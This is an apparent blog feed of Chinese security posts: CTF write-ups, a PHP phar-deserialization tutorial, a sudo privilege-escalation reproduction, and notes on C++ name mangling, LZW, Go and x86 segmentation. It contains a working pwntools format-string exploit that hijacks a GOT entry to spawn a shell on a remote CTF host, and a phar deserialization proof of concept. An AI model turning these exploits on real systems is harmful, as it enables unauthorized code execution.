alt="upload successful"></p><h2 id="10-ascii"><a href="#10-ascii" class="headerlink" title="10.ascii"></a>10.ascii</h2><pre><code class="c">&gt;&gt;&gt; l=[84,104,101,32,115,111,108,117,116,105,111,110,32,105,115,58,32,105,104,98,100,115,105,101,111, 112,100,99,110]&gt;&gt;&gt; a=&#39;&#39;&gt;&gt;&gt; for i in l:...  a+=chr(i)...&gt;&gt;&gt; a&#39;The solution is: ihbdsieopdcn&#39;</code></pre><p>flag:ihbdsieopdcn</p><h2 id="11-forensics"><a href="#11-forensics" class="headerlink" title="11.forensics"></a>11.forensics</h2><p>binwalk查看文件</p><p><img src="/images/pasted-195.png" srcset="/img/loading.gif" alt="upload successful"></p><p>foremost分离文件</p><p>查看有用信息得到图片就是flag</p><p><img src="/images/pasted-196.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:360HA360</p><h2 id="12-usb"><a href="#12-usb" class="headerlink" title="12.usb"></a>12.usb</h2><p>发现是usb协议的流量分析然后找到了罗技</p><p><img src="/images/pasted-197.png" srcset="/img/loading.gif" alt="upload successful"></p><p>然后我们查看数据发现代表着鼠标的移动，导出数据到a.txt</p><pre><code class="c">00: ff :00:0000: ff :00:0000: ff :00:0000: fd: 00: 0000: ff :00:0000: ff :00:0000: fe: ff :0000: fd: 00:0000: fb:00: 0000: fc :00:0000: fb:00:0000: fc :00:0000: fc: ff :0000: fe: 00: 0000:fe:ff:0000: fe:00:0000: ff :00: 0000: fe:ff :0000: ff: ff :0001 :00: 00:00</code></pre><p>然后我们转换坐标</p><p>awk -F: ‘function comp(v){if(v&gt;127)v-=256;return v}{x+=comp(strtonum(“0x”$2));y+=comp(strtonum(“0x”$3))}$1==”01”{print x,y}’ a.txt &gt; b.txt</p><p>得到坐标后用gnuplot画出flag即可</p><p>flag为tHe_CAT_is_the_CULpRiT</p><h2 id="14-MasterofZip-Middle"><a href="#14-MasterofZip-Middle" class="headerlink" title="14.MasterofZip-Middle"></a>14.MasterofZip-Middle</h2><p>爆破得到password!</p><p><img src="/images/pasted-198.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到伪加密的包用winhex修改为00</p><p>得到flag.png用winhex审计后发现高度不够</p><p>我们调整高度后最终得到flag</p><p><img src="/images/pasted-199.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag{b2599e17dd7c48ae62d008a1a145cc6d9928d4ac}</p><h2 id="15-数据包分析-Easy"><a href="#15-数据包分析-Easy" class="headerlink" title="15.数据包分析-Easy"></a>15.数据包分析-Easy</h2><p>导出HTTP所有文件</p><p><img src="/images/pasted-200.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到flag.php，即flag</p><p>flag{3eyufhnj87}</p><h2 id="16-easyelf"><a href="#16-easyelf" class="headerlink" title="16.easyelf"></a>16.easyelf</h2><p>angr求解即可</p><p><img src="/images/pasted-201.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag{Thunk_c0des_xoR_thr3e_de4l}</p><h2 id="22-giao"><a href="#22-giao" class="headerlink" title="22.giao"></a>22.giao</h2><p>payload:</p><p><img src="/images/pasted-202.png" srcset="/img/loading.gif" alt="upload successful"></p><p>即可得到flag{5f284498df}</p><h2 id="23-easy-fmt"><a href="#23-easy-fmt" class="headerlink" title="23.easy_fmt"></a>23.easy_fmt</h2><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;p = process(&#39;./easy_fmt&#39;)e = ELF(&#39;./easy_fmt&#39;)libc=ELF(&quot;/libc64.so&quot;)p=remote(&quot;39.104.173.175&quot;,&quot;15502&quot;)get_libc_payload = &quot;%7$s&quot;.ljust(8, &#39;a&#39;)+p64(e.got[&#39;read&#39;])p.send(get_libc_payload)read_libc = u64(p.recv(6)+&#39;\x00\x00&#39;)print hex(read_libc)begin_libc = read_libc-libc.symbols[&#39;read&#39;]print hex(begin_libc)one_gadget_libc = begin_libc+libc.symbols[&#39;system&#39;]print hex(one_gadget_libc)a1 = (one_gadget_libc &amp; 0xff0000) &gt;&gt; 16a2 = (one_gadget_libc &amp; 0xff00) &gt;&gt; 8a3 = one_gadget_libc &amp; 0xffprint hex(a1)+hex(a2)+hex(a3)point1 = [2, a1]point2 = [1, a2]point3 = [0, a3]def swap(p1, p2):    for i in range(2):        t = p1[i]        p1[i] = p2[i]        p2[i] = tif a1 &gt; a2:    swap(point1, point2)if a1 &gt; a3:    swap(point1, point3)if a2 &gt; a3:    swap(point2, point3)print point1+point2+point3point2[1] = point2[1]-point1[1]point3[1] = point3[1]-point2[1]-point1[1]print point1+point2+point3write_got_payload = &#39;%&#39;+str(point1[1])+&#39;c&#39;+&#39;%12$hhn&#39;write_got_payload += &#39;%&#39;+str(point2[1])+&#39;c&#39;+&#39;%13$hhn&#39;write_got_payload += &#39;%&#39;+str(point3[1])+&#39;c&#39;+&#39;%14$hhn&#39;write_got_payload = write_got_payload.ljust(48, &#39;a&#39;)write_got_payload += p64(e.got[&#39;printf&#39;]+point1[0])write_got_payload += p64(e.got[&#39;printf&#39;]+point2[0])write_got_payload += p64(e.got[&#39;printf&#39;]+point3[0])p.send(write_got_payload)sleep(1)p.sendline(&quot;/bin/sh\x00&quot;)p.interactive()</code></pre><p>得到flag{279920429c}</p><h2 id="24-EasyRE"><a href="#24-EasyRE" class="headerlink" title="24.EasyRE"></a>24.EasyRE</h2><p><img src="/images/pasted-203.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag{Let_Us_st4rt_R3v3rSe}</p><h2 id="25-EASYReverse"><a href="#25-EASYReverse" class="headerlink" title="25.EASYReverse"></a>25.EASYReverse</h2><p>ida查看程序，发现是个没有查表的base64，遂用脚本分离出了前一部分</p><p><img src="/images/pasted-204.png" srcset="/img/loading.gif" alt="upload successful"></p><p>最后三个字节手动拼凑得到正确flag</p><p>flag{JSe3psfxa2X96USgM58346t4Ta87uRQy}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-编码编码&quot;&gt;&lt;a href=&quot;#1-编码编码&quot; class=&quot;headerlink&quot; title=&quot;1.编码编码&quot;&gt;&lt;/a&gt;1.编码编码&lt;/h2&gt;&lt;p&gt;base64解码即可得到flag!&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/pasted-183.
      
    
    </summary>
    
      <category term="CTF" scheme="https://bufsnake.github.io/categories/CTF/"/>
    
    
      <category term="wp" scheme="https://bufsnake.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>phar反序列化</title>
    <link href="https://bufsnake.github.io/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"/>
    <id>https://bufsnake.github.io/phar反序列化.html</id>
    <published>2019-12-13T01:50:20.000Z</published>
    <updated>2019-12-13T01:59:26.878Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞作用"><a href="#漏洞作用" class="headerlink" title="漏洞作用"></a>漏洞作用</h2><p><code>在不使用unserialize()函数的情况下触发PHP反序列化漏洞</code></p><h2 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h2><p><code>使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Meta data 信息会被反序列化 如果要生成phar文件，要在php.ini中把phar只读给关闭</code></p><pre><code class="c">php.ini[Phar]phar.readonly = Off</code></pre><h2 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h2><pre><code class="c">&lt;?php$phar = new Phar(&#39;test.phar&#39;);$phar-&gt;startBuffering();$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;text&#39;);$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); // add object of any class as meta dataclass AnyClass {}$object = new AnyClass;$object-&gt;data = &#39;rips&#39;;$phar-&gt;setMetadata($object);$phar-&gt;stopBuffering();</code></pre><pre><code class="c">php -c /Applications/XAMPP/xamppfiles/etc/php.ini phar.php //执行生成的文件如下</code></pre><p><img src="/images/pasted-181.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">&lt;?php// add object of any class as meta dataclass AnyClass {    function __destruct(){        echo $this-&gt;data;    }    function __sleep(){        echo &#39;sleep&#39;;    }   function __wakeup(){       echo &#39;wakeup&lt;br&gt;&#39;;   }}include(&#39;phar://test.phar&#39;); // 触发反序列化</code></pre><p><img src="/images/pasted-182.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="能够触发反序列化的函数有"><a href="#能够触发反序列化的函数有" class="headerlink" title="能够触发反序列化的函数有"></a>能够触发反序列化的函数有</h2><pre><code class="c">include(&#39;phar://test.phar&#39;);var_dump(file(&#39;phar://test.phar&#39;));var_dump(fopen(&#39;phar://test.phar&#39;,&#39;r&#39;));var_dump(file_get_contents(&#39;phar://test.phar&#39;));var_dump(file_get_contents(&#39;phar://test.jpg&#39;));(把文件名改成jpg也有效)var_dump(file_exists(&#39;phar://test.phar&#39;));file_exists($_GET[&#39;file&#39;]);md5_file($_GET[&#39;file&#39;]);filemtime($_GET[&#39;file&#39;]);filesize($_GET[&#39;file&#39;]);</code></pre><h2 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h2><p><a href="https://mp.weixin.qq.com/s/TNAdeBNBErYjtTGGfentFg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/TNAdeBNBErYjtTGGfentFg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞作用&quot;&gt;&lt;a href=&quot;#漏洞作用&quot; class=&quot;headerlink&quot; title=&quot;漏洞作用&quot;&gt;&lt;/a&gt;漏洞作用&lt;/h2&gt;&lt;p&gt;&lt;code&gt;在不使用unserialize()函数的情况下触发PHP反序列化漏洞&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;触发
      
    
    </summary>
    
      <category term="学习研究" scheme="https://bufsnake.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="phar反序列化" scheme="https://bufsnake.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>C++ 符号修饰和函数签名</title>
    <link href="https://bufsnake.github.io/C-%E7%AC%A6%E5%8F%B7%E4%BF%AE%E9%A5%B0%E5%92%8C%E5%87%BD%E6%95%B0%E7%AD%BE%E5%90%8D.html"/>
    <id>https://bufsnake.github.io/C-符号修饰和函数签名.html</id>
    <published>2019-11-19T10:16:23.000Z</published>
    <updated>2019-11-25T09:43:42.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>在开始的时候，源文件与目标文件的函数的符号名是相同的。后来UNIX平台和C语言发明时，已经存在很多汇编编写的库和目标文件，一个C程序要使用他们，就不能定义这些库中定义的函数和变量的名字作为符号，否则会产生冲突。为了防止类似的符号名冲突，UNIX下的C语言就规定，C语言源代码文件中的所有全局的变量和函数经过编译以后，相对应的符号名前加上下划线”<em>“。而Fortran语言的源代码经过编译以后，所有的符号名前加上”</em>“，后面也加上”_”。比如一个C语言函数”foo”，那么它编译后的符号名就是”_foo”；如果是Fortran语言，就是”<em>foo</em>“。 这种方法能够暂时减少多种语言目标文件之间的符号冲突的概率，但还是没有从根本上解决符号冲突的问题。比如同一种语言编写的目标文件还有可能会产生符号冲突，于是像C++这样的后来设计的语言开始考虑到了这个问题，增加了名称空间（Namespace）的方法来解决多模块的符号冲突问题。 在现在的Linux下的GCC编译器中，默认情况下已经去掉了在C语言符号前加”<em>“的这种方式；但是Windows平台下的编译器还保持的这样的传统，比如Visual C++编译器就会在C语言符号前加”</em>“，GCC在Windows平台下的版本（cygwin、mingw）也会加”_”。GCC编译器也可以通过参数选项”-fleading-underscore”或”-fno-leading-underscore”来打开和关闭是否在C语言符号前加上下划线。</p></blockquote><h2 id="符号修饰"><a href="#符号修饰" class="headerlink" title="符号修饰"></a>符号修饰</h2><pre><code class="c">int func(int);  float func(float);  class C {      int func(int);      class C2 {          int func(int);      };  };  namespace N {      int func(int);      class C {          int func(int);      };  } </code></pre><p><code>上面的6个函数签名在GCC编译器下，相对应的修饰后名称如下所示：</code></p><pre><code class="c">函数签名                       符号名int func(int)                  _Z4funcifloat func(float)              _Z4funcfint C::func(int)               _ZN1C4funcEiint C::C2::func(int)           _ZN1C2C24funcEiint N::func(int)               _ZN1N4funcEiint N::C::func(int)            _ZN1N1C4funcEi</code></pre><p><code>GCC的基本C++名称修饰方法如下</code></p><blockquote><p>所有的符号都以”_Z”开头，对于嵌套的名字（在名称空间或在类里面的），后面紧跟”N”，然后是各个名称空间和类的名字，每个名字前是名字字符串长度，再以”E”结尾。</p></blockquote><blockquote><p>比如N::C::func经过名称修饰以后就是_ZN1N1C4funcE。</p></blockquote><blockquote><p>对于一个函数来说，它的参数列表紧跟在”E”后面，对于int类型来说，就是字母”i”。</p></blockquote><blockquote><p>所以整个N::C::func(int)函数签名经过修饰为_ZN1N1C4funcEi。</p></blockquote><p><code>C++中的全局变量和静态变量也有同样的机制</code></p><blockquote><p>对于全局变量来说，它跟函数一样都是一个全局可见的名称，它也遵循上面的名称修饰机制，比如一个名称空间foo中的全局变量bar，它修饰后的名字为：_ZN3foo3barE。</p></blockquote><blockquote><p>变量的类型并没有被加入到修饰后名称中，所以不论这个变量是整形还是浮点型甚至是一个全局对象，它的名称都是一样的。</p></blockquote><blockquote><p>名称修饰机制也被用来防止静态变量的名字冲突。</p></blockquote><blockquote><p>比如 main() 函数里面有一个静态变量叫foo，而 func() 函数里面也有一个静态变量叫foo。</p></blockquote><blockquote><p>为了区分这两个变量，GCC会将它们的符号名分别修饰成两个不同的名字”_ZZ4mainE3foo”和”_ZZ4funcE3foo”.</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在开始的时候，源文件与目标文件的函数的符号名是相同的。后来UNIX平台和C语言发明时，已经存在很多汇编编写的库和目
      
    
    </summary>
    
      <category term="C语言" scheme="https://bufsnake.github.io/categories/C%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="C++符号修饰" scheme="https://bufsnake.github.io/tags/C-%E7%AC%A6%E5%8F%B7%E4%BF%AE%E9%A5%B0/"/>
    
  </entry>
  
  <entry>
    <title>LZW无损压缩算法</title>
    <link href="https://bufsnake.github.io/LZW%E6%97%A0%E6%8D%9F%E5%8E%8B%E7%BC%A9%E7%AE%97%E6%B3%95.html"/>
    <id>https://bufsnake.github.io/LZW无损压缩算法.html</id>
    <published>2019-11-08T13:25:32.000Z</published>
    <updated>2019-11-25T09:42:53.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>在看writeup的时候，题目含有base64和lzw算法，由于不了解lzw算法，遂学习一下。</p></blockquote><hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>LZW就是通过建立一个字符串表，用较短的代码来表示较长的字符串来实现压缩。</p></blockquote><hr><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><blockquote><p>从原字符串不断地读入新的字符，并试图将单个字符或字符串编码为记号 (Symbol)。</p></blockquote><blockquote><p>维护两个变量，一个是P (Previous)，表示手头已有的，还没有被编码的字符串，一个是C (current)，表示当前新读进来的字符。</p></blockquote><ol><li>初始状态，字典里只有所有的默认项，例如0-&gt;a，1-&gt;b，2-&gt;c。此时P和C都是空的。</li><li>读入新的字符C，与P合并形成字符串P+C。</li><li><p>在字典里查找P+C，如果:</p><ol><li><p>P+C在字典里，P=P+C。</p></li><li><p>P+C不在字典里，将P的记号输出；在字典中为P+C建立一个记号映射；更新P=C。</p></li></ol></li><li><p>返回步骤2重复，直至读完原字符串中所有字符。</p></li></ol><blockquote><p>以上表示的是编码中间的一般过程，在收尾的时候有一些特殊的处理，即步骤2中，如果到达字符串尾部，没有新的C读入了，则将手头的P对应的记号输出，结束。</p></blockquote><blockquote><p>编码过程的核心就在于第3步，需要理解P究竟是什么。P是当前维护的，可以被编码为记号的子串。注意P是可以被编码为记号，但还并未输出。新的字符C不断被读入并添加到P的尾部，只要P+C仍然能在字典里找到，就不断增长更新P=P+C，这样就能将一个尽可能长的字串P编码为一个记号，这就是压缩的实现。当新的P+C无法在字典里找到时，我们没有办法，输出已有的P的编码记号，并为新子串P+C建立字典表项。然后新的P从单字符C开始，重新增长，重复上述过程。</p></blockquote><pre><code class="c">用一个例子来说明编码的过程ababcababac初始状态字典里有三个默认的映射：Symbol    String0         a1         b2         c开始编码：Step   P   C   P+C   P+C in Dict ？      Action               Output1      -   a    a        Yes             更新P=a               -2      a   b    ab       No              添加3-&gt;ab，更新P=b     03      b   a    ba       No              添加4-&gt;ba，更新P=a     14      a   b    ab       Yes             更新P=ab              -5      ab  c    abc      No              添加5-&gt;abc，更新P=c    36      c   a    ca       No              添加6-&gt;ca，更新P=a     27      a   b    ab       Yes             更新P=ab              -8      ab  a    aba      No              添加7-&gt;aba，更新P=a    39      a   b    ab       Yes             更新P=ab              -10     ab  a    aba      Yes             更新P=aba             -11     aba c    abac     No              添加8-&gt;abac，更新P=c   712     c   -    -        -               -                     2注意编码过程中的第3-4步，第7-8步以及8-10步，子串P发生了增长，直到新的P+C无法在字典中找到，则将当前的P输出，P则更新为单字符C，重新开始增长。输出的结果为0132372，完整的字典为：Symbol String0      a1      b2      c3      ab4      ba5      abc6      ca7      aba8      abac原字符串对应到压缩后的编码的0 1 3  2 3  7   2a b ab c ab aba c</code></pre><hr><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><ol><li>初始状态，字典里只有所有的默认项，例如0-&gt;a，1-&gt;b，2-&gt;c。此时pW和cW都是空的。</li><li>读入第一个的符号cW，解码输出。注意第一个cW肯定是能直接解码的，而且一定是单个字符。</li><li>赋值pW=cW。</li><li>读入下一个符号cW。</li><li><p>在字典里查找cW，如果:</p><ol><li><p>cW在字典里：</p><ol><li>解码cW，即输出 Str(cW)。</li><li>令P=Str(pW)，C=Str(cW)的<strong>第一个字符</strong>。</li><li>在字典中为P+C添加新的记号映射。</li></ol></li><li><p>cW不在字典里:</p><ol><li>令P=Str(pW)，C=Str(pW)的<strong>第一个字符</strong>。</li><li>在字典中为P+C添加新的记号映射，这个新的记号一定就是cW。</li><li>输出P+C。</li></ol></li></ol></li><li>返回步骤3重复，直至读完所有记号。</li></ol><pre><code class="c">记号0 1 3  2 3  7   2解码a b ab c ab aba c初始状态字典里有三个默认的映射：Symbol    String0         a1         b2         cStep pW cW   cW in Dict ？   Action                             Output0    -  0       Yes          P=-,C=a,P+C=a                      a1    0  1       Yes          P=a，C=b，P+C=ab，添加3-&gt;ab          b2    1  3       Yes          P=b，C=a，P+C=ba，添加4-&gt;ba          ab3    3  2       Yes          P=ab，C=c，P+C=abc，添加5-&gt;abc       c4    2  3       Yes          P=c，C=a，P+C=ca，添加6-&gt;ca          ab5    3  7       No           P=ab，C=a，P+C=aba，添加7-&gt;aba       aba6    7  2       Yes          P=aba，C=c，P+C=abac，添加8-&gt;abac    c</code></pre><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><pre><code class="c">默认的映射表通常为255行，也就是ASCII码表的长度，拓展从256开始。加密：不断读取源数据，直到不在映射表里，输出P并添加一个新的映射解密：读取记号流，如果在映射表里，就输出并添加一个映射</code></pre><hr><h2 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h2><p><a href="https://segmentfault.com/a/1190000011425787" target="_blank" rel="noopener">LZW压缩算法</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在看writeup的时候，题目含有base64和lzw算法，由于不了解lzw算法，遂学习一下。&lt;/p&gt;
&lt;/blo
      
    
    </summary>
    
      <category term="算法" scheme="https://bufsnake.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="LZW压缩算法" scheme="https://bufsnake.github.io/tags/LZW%E5%8E%8B%E7%BC%A9%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>目录遍历到递归</title>
    <link href="https://bufsnake.github.io/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%88%B0%E9%80%92%E5%BD%92.html"/>
    <id>https://bufsnake.github.io/目录遍历到递归.html</id>
    <published>2019-10-30T12:18:23.000Z</published>
    <updated>2019-11-25T09:42:53.148Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>半个月感觉没收获多少，主要学习了加密解密、编译原理、Windows内核相关基础教程、Golang的学习，并没有学完，一直在坚持和学校一样的教学体系，每天的课程是不一样的，不会导致学习疲劳，三分热度，一直抱着一本书看下去，几天就失了兴趣，比如编译原理…</p></blockquote><blockquote><p>一步一jo印</p></blockquote><h3 id="中序"><a href="#中序" class="headerlink" title="中序"></a>中序</h3><blockquote><p>之前学习Java时，没有想到写一个遍历指定目录的程序，最近在学习Golang，想着用GO语言实现以下。</p></blockquote><blockquote><p>思路</p></blockquote><ol><li>指定需要遍历的目录</li><li>列出目录下的所有文件以及文件夹</li><li>打印文件名或文件夹名</li><li>判断是否为文件夹，是则去第1步，否则去第5步</li><li>退出</li></ol><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><blockquote><p>用递归的方式实现该程序</p></blockquote><pre><code class="go">package mainimport (    &quot;fmt&quot;    &quot;io/ioutil&quot;)func main() {    listDir(&quot;/Users/bufsnake&quot;, 0)}func listDir(dir string, level int) {    s := &quot;&quot;    for i := 0; i &lt; level; i++ {        s = s + &quot;   &quot;    }    fileInfos, err := ioutil.ReadDir(dir)    if err != nil {        fmt.Println(err)    }    for _, file := range fileInfos {        fi := dir + &quot;/&quot; + file.Name()        fmt.Println(s + fi)        if file.IsDir() {            listDir(fi, level+1)        }    }}</code></pre><blockquote><p>运行结果</p></blockquote><pre><code class="bash">☁  golang  go run mulubianli.go/Users/bufsnake/golang/_   /Users/bufsnake/golang/_/main.go/Users/bufsnake/golang/array.go/Users/bufsnake/golang/bufio   /Users/bufsnake/golang/bufio/main.go/Users/bufsnake/golang/ch1   /Users/bufsnake/golang/ch1/dup1      /Users/bufsnake/golang/ch1/dup1/main.go   /Users/bufsnake/golang/ch1/dup2      /Users/bufsnake/golang/ch1/dup2/file      /Users/bufsnake/golang/ch1/dup2/main.go   /Users/bufsnake/golang/ch1/echo1      /Users/bufsnake/golang/ch1/echo1/main.go   /Users/bufsnake/golang/ch1/echo2      /Users/bufsnake/golang/ch1/echo2/main.go   /Users/bufsnake/golang/ch1/echo3      /Users/bufsnake/golang/ch1/echo3/main.go   /Users/bufsnake/golang/ch1/helloworld      /Users/bufsnake/golang/ch1/helloworld/README.md      /Users/bufsnake/golang/ch1/helloworld/main.go   /Users/bufsnake/golang/ch1/server1      /Users/bufsnake/golang/ch1/server1/mian.go/Users/bufsnake/golang/chabie   /Users/bufsnake/golang/chabie/chabie   /Users/bufsnake/golang/chabie/main.go/Users/bufsnake/golang/deferDemo.go/Users/bufsnake/golang/deferDemo1.go/Users/bufsnake/golang/exception.go/Users/bufsnake/golang/func.go/Users/bufsnake/golang/gob_msgpack.go/Users/bufsnake/golang/main.go/Users/bufsnake/golang/mapDemo.go/Users/bufsnake/golang/mulubianli.go/Users/bufsnake/golang/rand   /Users/bufsnake/golang/rand/main.go/Users/bufsnake/golang/strconv   /Users/bufsnake/golang/strconv/main.go/Users/bufsnake/golang/time   /Users/bufsnake/golang/time/main.go/Users/bufsnake/golang/web   /Users/bufsnake/golang/web/ch1      /Users/bufsnake/golang/web/ch1/login.gtpl      /Users/bufsnake/golang/web/ch1/main      /Users/bufsnake/golang/web/ch1/main.go   /Users/bufsnake/golang/web/ginDemo.go</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>Go Go Golang</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;半个月感觉没收获多少，主要学习了加密解密、编译原理、Windows内核相关基础教程、Golang的学习，并没有学完
      
    
    </summary>
    
      <category term="Go" scheme="https://bufsnake.github.io/categories/Go/"/>
    
    
      <category term="golang" scheme="https://bufsnake.github.io/tags/golang/"/>
    
      <category term="go" scheme="https://bufsnake.github.io/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>Sudo提权漏洞复现</title>
    <link href="https://bufsnake.github.io/Sudo%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html"/>
    <id>https://bufsnake.github.io/Sudo提权漏洞复现.html</id>
    <published>2019-10-16T13:49:17.000Z</published>
    <updated>2019-11-25T09:42:53.164Z</updated>
    
    <content type="html"><![CDATA[<h3 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h3><blockquote><p>该漏洞虽然鸡肋，但保不准哪天碰到了，还是复现一下吧</p></blockquote><h3 id="Sudoer"><a href="#Sudoer" class="headerlink" title="Sudoer"></a>Sudoer</h3><blockquote><p>修改sudoer文件,如下</p></blockquote><p><img src="/images/pasted-176.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>我的低权限用户账号是admin</p></blockquote><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><blockquote><p>在admin账号权限下运行</p></blockquote><p><img src="/images/pasted-177.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>在vim界面输入</p></blockquote><p><img src="/images/pasted-178.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>得到root权限</p></blockquote><p><img src="/images/pasted-179.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>sudo 1.8.28 之前的所有版本</p></blockquote><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><blockquote><p>升级sudo</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;开篇&quot;&gt;&lt;a href=&quot;#开篇&quot; class=&quot;headerlink&quot; title=&quot;开篇&quot;&gt;&lt;/a&gt;开篇&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;该漏洞虽然鸡肋，但保不准哪天碰到了，还是复现一下吧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;Sudoe
      
    
    </summary>
    
      <category term="学习研究" scheme="https://bufsnake.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="漏洞复现" scheme="https://bufsnake.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>段的机制浅析</title>
    <link href="https://bufsnake.github.io/%E6%AE%B5%E7%9A%84%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90.html"/>
    <id>https://bufsnake.github.io/段的机制浅析.html</id>
    <published>2019-10-13T09:07:49.000Z</published>
    <updated>2019-11-25T09:42:53.176Z</updated>
    
    <content type="html"><![CDATA[<h2 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h2><blockquote><p>X86 CPU的3个模式：实模式(直接操作物理地址)、保护模式(操作虚拟内存)和虚拟8086模式(保护模式下的16位模拟)</p></blockquote><blockquote><p>X64：x86是intel推出的复杂指令集，后来amd拓展了X86指令集，称为称为x86-64，后更名为AMD 64，intel也出了自己的一套64位指令集，但是不向下兼容，所以就没了，继而移植了amd 64位指令集，称为intel 64(能够兼容x86指令集的)</p></blockquote><h2 id="段的机制"><a href="#段的机制" class="headerlink" title="段的机制"></a>段的机制</h2><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><pre><code class="c">mov dword ptr ds:[0x123456],eax实际操作的是 ds.base + 0x123456 地址</code></pre><h4 id="段寄存器的种类"><a href="#段寄存器的种类" class="headerlink" title="段寄存器的种类"></a>段寄存器的种类</h4><blockquote><p>ES(拓展段)、CS(代码段)、SS(堆栈段)、DS(数据段)、FS、GS、LDTR、TR 共8个段寄存器</p></blockquote><h4 id="段寄存器的读写"><a href="#段寄存器的读写" class="headerlink" title="段寄存器的读写"></a>段寄存器的读写</h4><pre><code class="c">读只能读16位，写能写入96位mov ax, ds    必须指定写入的地址为16位mov ds, eax除LDTR和TR外，其余段寄存器可用MOV指令进行读写</code></pre><h4 id="段寄存器的结构"><a href="#段寄存器的结构" class="headerlink" title="段寄存器的结构"></a>段寄存器的结构</h4><p><img src="/images/pasted-170.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">struct SegMent{    WORD Selecter,   16bit//可见部分 段选择子    WROD Attribute,  16bit//属性  可读/可写/可执行    DWORD Base,      16bit//Base  段的起始地址    DWORD Limit      16bit//Limit 段的整体长度};</code></pre><p><img src="/images/pasted-171.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="根据上图进行段寄存器的不可见部分探测"><a href="#根据上图进行段寄存器的不可见部分探测" class="headerlink" title="根据上图进行段寄存器的不可见部分探测"></a>根据上图进行段寄存器的不可见部分探测</h4><h5 id="探测Attribute是否存在"><a 